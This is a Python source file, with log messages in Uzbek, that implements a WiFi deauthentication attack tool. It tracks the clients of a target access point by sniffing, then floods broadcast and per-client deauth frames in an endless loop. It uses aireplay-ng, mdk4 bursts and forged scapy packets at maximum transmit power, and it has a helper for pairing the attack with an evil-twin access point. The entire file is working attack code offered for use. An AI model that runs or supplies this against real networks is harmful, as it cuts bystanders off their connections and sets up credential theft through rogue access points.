#!/usr/bin/env python3
from __future__ import annotations
import os
import re
import subprocess
import threading
import time
from typing import Callable, List, Optional, Set
import wifi_util as wu
try:
    from scapy.all import Dot11, Dot11Deauth, Dot11Beacon, RadioTap, sniff, sendp
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False
_MAC_RE = re.compile('(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')

def _norm_mac(mac: str) -> str:
    return mac.strip().upper()

def _is_broadcast(mac: str) -> bool:
    m = _norm_mac(mac)
    return m in ('FF:FF:FF:FF:FF:FF', '00:00:00:00:00:00')

class ClientTracker:

    def __init__(self, bssid: str):
        self.bssid = _norm_mac(bssid)
        self._clients: Set[str] = set()
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None

    def add(self, mac: Optional[str]) -> None:
        if not mac:
            return
        m = _norm_mac(mac)
        if _is_broadcast(m) or m == self.bssid:
            return
        with self._lock:
            self._clients.add(m)

    def add_many(self, macs) -> None:
        for m in macs or []:
            self.add(m)

    def list(self) -> List[str]:
        with self._lock:
            return sorted(self._clients)

    def count(self) -> int:
        with self._lock:
            return len(self._clients)

    def _on_packet(self, pkt) -> None:
        if not HAS_SCAPY or not pkt.haslayer(Dot11):
            return
        try:
            d = pkt[Dot11]
            addrs = [d.addr1, d.addr2, d.addr3, getattr(d, 'addr4', None)]
            bssid = self.bssid
            related = any((a and _norm_mac(a) == bssid for a in addrs if a))
            if not related:
                return
            for a in addrs:
                if not a:
                    continue
                ma = _norm_mac(a)
                if ma != bssid and (not _is_broadcast(ma)):
                    self.add(ma)
        except Exception:
            pass

    def start_sniff(self, mon_iface: str, log=print) -> None:
        if not HAS_SCAPY:
            log("[!] scapy yo'q — mijoz kuzatuvi o'chiq (faqat aireplay/mdk4)")
            return
        if self._thread and self._thread.is_alive():
            return
        self._stop.clear()

        def loop():
            log(f'[+] Mijoz kuzatuvi boshlandi @ {mon_iface} (BSSID {self.bssid})')
            while not self._stop.is_set():
                try:
                    sniff(iface=mon_iface, prn=self._on_packet, store=False, timeout=4)
                except Exception:
                    if self._stop.wait(1):
                        break
            log("[*] Mijoz kuzatuvi to'xtadi")
        self._thread = threading.Thread(target=loop, daemon=True)
        self._thread.start()

    def stop_sniff(self) -> None:
        self._stop.set()

class DeauthStack:

    def __init__(self, mon_iface: str, bssid: str, channel: int=6, log: Callable=print):
        self.mon = mon_iface
        self.bssid = _norm_mac(bssid)
        try:
            self.channel = int(channel)
        except (TypeError, ValueError):
            self.channel = 6
        self.log = log
        self.tracker = ClientTracker(self.bssid)
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._mdk4_proc: Optional[subprocess.Popen] = None
        self.has_mdk4 = wu.which('mdk4') is not None
        self.has_aireplay = wu.which('aireplay-ng') is not None
        self.stats = {'broadcast': 0, 'directed': 0, 'mdk4': 0, 'rounds': 0}

    def seed_clients(self, macs: Optional[List[str]]=None) -> None:
        self.tracker.add_many(macs)

    def _aireplay_broadcast(self, count: int=10) -> bool:
        if not self.has_aireplay:
            return False
        r = wu.run(['aireplay-ng', '-0', str(count), '-a', self.bssid, '--ignore-negative-one', self.mon], timeout=8)
        self.stats['broadcast'] += count
        return True

    def _aireplay_directed(self, client: str, count: int=6) -> None:
        if not self.has_aireplay:
            return
        wu.run(['aireplay-ng', '-0', str(count), '-a', self.bssid, '-c', client, '--ignore-negative-one', self.mon], timeout=6)
        self.stats['directed'] += count

    def _mdk4_burst(self, seconds: float=2.0) -> None:
        if not self.has_mdk4:
            return
        try:
            proc = subprocess.Popen(['mdk4', self.mon, 'd', '-B', self.bssid], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(min(seconds, 2.5))
            proc.terminate()
            try:
                proc.wait(timeout=1.5)
            except Exception:
                proc.kill()
            self.stats['mdk4'] += 1
        except Exception as e:
            self.log(f'[!] mdk4: {e}')

    def _scapy_directed(self, client: str, count: int=4) -> None:
        if not HAS_SCAPY:
            return
        try:
            pkt1 = RadioTap() / Dot11(type=0, subtype=12, addr1=client, addr2=self.bssid, addr3=self.bssid) / Dot11Deauth(reason=7)
            pkt2 = RadioTap() / Dot11(type=0, subtype=12, addr1=self.bssid, addr2=client, addr3=self.bssid) / Dot11Deauth(reason=7)
            sendp([pkt1, pkt2] * count, iface=self.mon, verbose=0)
            self.stats['directed'] += count
        except Exception:
            pass

    def burst(self, seconds: int=12) -> None:
        if not wu.iface_exists(self.mon):
            self.log(f"[-] Monitor interfeys yo'q: {self.mon}")
            return
        wu.set_channel(self.mon, self.channel, force_raw=True)
        wu.set_txpower_max(self.mon, log=self.log)
        self.tracker.start_sniff(self.mon, log=self.log)
        self.log(f"[*] Uzish to'lqini {seconds}s | BSSID={self.bssid} | aireplay={('bor' if self.has_aireplay else 'yoq')} mdk4={('bor' if self.has_mdk4 else 'yoq')}")
        end = time.time() + seconds
        while time.time() < end:
            self.stats['rounds'] += 1
            self._aireplay_broadcast(5)
            clients = self.tracker.list()
            for mac in clients[:4]:
                if time.time() >= end:
                    break
                self._aireplay_directed(mac, 3)
                if not self.has_aireplay:
                    self._scapy_directed(mac, 2)
            if time.time() < end:
                self._mdk4_burst(1.2)
            time.sleep(0.15)
        self.log(f"[+] To'lqin tugadi | mijozlar={self.tracker.count()} | efir={self.stats['broadcast']} yo'naltirilgan={self.stats['directed']}")

    def start_continuous(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        if not wu.iface_exists(self.mon):
            self.log(f"[-] Monitor interfeys yo'q: {self.mon}")
            return
        wu.set_channel(self.mon, self.channel, force_raw=True)
        wu.set_txpower_max(self.mon, log=self.log)
        self.tracker.start_sniff(self.mon, log=self.log)
        self._stop.clear()

        def loop():
            self.log(f"[+] Uzish boshlandi @ {self.mon} → {self.bssid} | mdk4={('yoqilgan' if self.has_mdk4 else 'o‘chiq')}")
            while not self._stop.is_set():
                self.stats['rounds'] += 1
                self._aireplay_broadcast(10)
                clients = self.tracker.list()
                for mac in clients[:16]:
                    if self._stop.is_set():
                        break
                    self._aireplay_directed(mac, 6)
                    if not self.has_aireplay:
                        self._scapy_directed(mac, 3)
                if not self._stop.is_set():
                    self._mdk4_burst(2.0)
                if self.stats['rounds'] % 8 == 0:
                    self.log(f"[uzish] raund={self.stats['rounds']} mijozlar={self.tracker.count()} efir={self.stats['broadcast']} yo'naltirilgan={self.stats['directed']}")
                self._stop.wait(0.8)
            self.log("[*] Uzish to'xtatildi")
        self._thread = threading.Thread(target=loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop.set()
        self.tracker.stop_sniff()
        if self._mdk4_proc:
            try:
                self._mdk4_proc.terminate()
            except Exception:
                pass
            self._mdk4_proc = None
        wu.run(['pkill', '-x', 'aireplay-ng'])
        wu.run(['pkill', '-x', 'mdk4'])
        if self._thread:
            self._thread.join(timeout=3)
            self._thread = None

def run_infinite_deauth(mon_iface: str, bssid: str, channel=None, log=print, extra_clients: Optional[List[str]]=None) -> None:
    iface = mon_iface
    if not wu.iface_exists(iface):
        iface = wu.resolve_station(mon_iface, log=log)
    mon = None
    if iface:
        if wu.iface_type(iface) == 'monitor':
            mon = iface
        else:
            mon = wu.airmon_start(iface, log=log)
    if not mon:
        log("[-] Monitor interfeys yo'q")
        return
    try:
        ch = int(channel) if channel is not None else 6
    except (TypeError, ValueError):
        ch = 6
    wu.set_channel(mon, ch, force_raw=True)
    stack = DeauthStack(mon, bssid, channel=ch, log=log)
    if extra_clients:
        stack.seed_clients(extra_clients)
    log(f'[*] Kuchli uzish | mon={mon} kanal={ch} | BSSID={bssid}')
    log('    vositalar: aireplay (efir) + aireplay (mijoz) + mdk4 + scapy')
    log("    To'xtatish: Ctrl+C")
    try:
        stack.burst(seconds=8)
        stack.start_continuous()
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log("[!] Foydalanuvchi to'xtatdi (Ctrl+C)")
    finally:
        stack.stop()

def make_stack_for_twin(mon: str, bssid: str, channel: int, log=print, seed_clients: Optional[List[str]]=None) -> DeauthStack:
    stack = DeauthStack(mon, bssid, channel=channel, log=log)
    if seed_clients:
        stack.seed_clients(seed_clients)
    return stack
